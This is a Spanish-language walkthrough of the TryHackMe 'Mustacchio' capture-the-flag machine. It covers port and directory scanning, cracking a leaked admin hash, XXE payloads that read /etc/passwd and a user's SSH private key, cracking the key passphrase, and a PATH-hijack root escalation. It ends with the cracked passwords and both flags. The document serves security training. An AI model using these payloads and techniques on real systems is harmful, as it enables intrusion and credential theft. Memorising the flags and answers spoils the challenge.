@@ -1,0 +1,140 @@
+Tryhackme
+Mustacchio
+
+nmap:
+	nmap -p- -sS -sC -sV --open -vvv -n -Pn 10.10.218.26 -oN mustaccio
+	• 22/tcp open ssh
+	• 80/tcp open http
+	• 8765/tcp open http
+
+Fuzzing
+	gobuster dir -u http://10.10.218.26/ -w /usr/share/dirb/wordlists/common.txt -x php
+	• /.hta (Status: 403) [Size: 277]
+	• /.hta.php (Status: 403) [Size: 277]
+	• /.htaccess (Status: 403) [Size: 277]
+	• /.htpasswd (Status: 403) [Size: 277]
+	• /.htaccess.php (Status: 403) [Size: 277]
+	• /.htpasswd.php
+	• /custom
+	• /images
+	• /fonts
+	• /robots.txt
+	• /server-status
+	gobuster dir -u http://10.10.218.26/custom -w /usr/share/dirb/wordlists/common.txt -x php
+	• /.hta (Status: 403) [Size: 277]
+	• /.hta.php (Status: 403) [Size: 277]
+	• /.htaccess (Status: 403) [Size: 277]
+	• /.htpasswd (Status: 403) [Size: 277]
+	• /.htaccess.php (Status: 403) [Size: 277]
+	• /.htpasswd.php
+
+Dentro de /custom encontramos una carpeta "/js/users.back"
+Nos llevamos ese archivo con el comando wget
+
+wget http://10.10.70.116/custom/js/users.bak
+Luego, al leer el archivo, encontramos un hash
+
+cat users.bak
+��0]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
+Decodificamos el hash con una herramienta en línea
+
+https://hashes.com/
+La respuesta es la siguiente: "1868e36a6d2b17d4c2745f1659433a54d4bc5f4b:bulldog19"
+
+Probamos usuario admin en el panel de administrador encontrado anteriormente en el puerto 8765
+Usuario: admin
+Contraseña: bulldog19
+
+Estamos dentro. Ahora encontramos un admin panel con una ventana donde se pueden subir comentarios. Al intentar una reverse shell en PHP no obtenemos resultados. Intentaremos por otra vía.
+
+Al investigar el código fuente de la página, encontramos lo siguiente:
+
+"<!-- Barry, you can now SSH in using your key!-->"
+Ejemplo = /auth/dontforget.bak
+
+El archivo "dontforget.bak" nos da la siguiente pista: "xml version="1.0" nos indica que es una página vulnerable a XXE inyección.
+
+Colocamos dentro del panel de carga el siguiente payload:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+   <!ELEMENT data ANY >
+   <!ENTITY name SYSTEM "file:///etc/passwd" >]>
+<comment>
+  <name>&name;</name>
+  <author>Pavandeep</author>
+  <com>Hacking Articles</com>
+</comment>
+
+Le damos a submit, pero antes interceptamos la petición con Burp Suite para ver el resultado.
+
+Como resultado, ahora podemos ver la carpeta "passwd" y encontramos el siguiente usuario
+
+barry:x:1003:1003::/home/barry:/bin/bash
+
+Ahora apuntaremos a obtener el permiso SSH de Barry. La carpeta que tiene el permiso se llama "id_rsa".
+
+Modificamos el anterior payload para obtener el id_rsa:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+   <!ELEMENT data ANY >
+   <!ENTITY name SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
+<comment>
+  <name>&name;</name>
+  <author>Pavandeep</author>
+  <com>Hacking Articles</com>
+</comment>
+
+Al obtener el "id_rsa", necesitamos crackear el hash para obtener la clave utilizando John de la siguiente forma:
+
+nano id_rsa
+**Pegamos el contenido que obtuvimos con la instrucción XXE**
+
+ssh2john id_rsa > hash
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+urieljames (clave)
+
+chmod 600 id_rsa
+
+ssh -i barry@(IP)
+Contraseña: urieljames
+
+Estamos dentro del puerto SSH, con permisos de Barry.
+
+Encontramos la flag de usuario:
+
+62d77a4d5f97d47c5aa38b3b2651b831
+
+Luego de eso, aplicamos el comando "find / -perm -4000 2>/dev/null" para ver qué se está ejecutando.
+
+Encontramos el comando "/home/joe/live_log".
+
+Aplicando el comando strings al archivo live_log encontramos:
+
+tail -f /var/log/nginx/access.log
+
+Procedemos a modificar el archivo "tail" ya que lo ejecuta root, en él pondremos comando de bash para escalar privilegios.
+
+cd tmp
+(tmp permite escribir archivos)
+
+echo "/bin/bash" > tail
+(colocamos el comando para escalar privilegios en "tail")
+
+chmod 777 tail
+(damos permisos a tail)
+
+export PATH=/tmp:.$PATH
+(colocamos el archivo modificado en el sistema)
+
+/home/joe/live_log
+(ejecutamos el archivo con nuestra modificación)
+
+whoami
+root
+(somos root)
+
+cat /root/root.txt
+3223581420d906c4dd1a5f9b530393a5
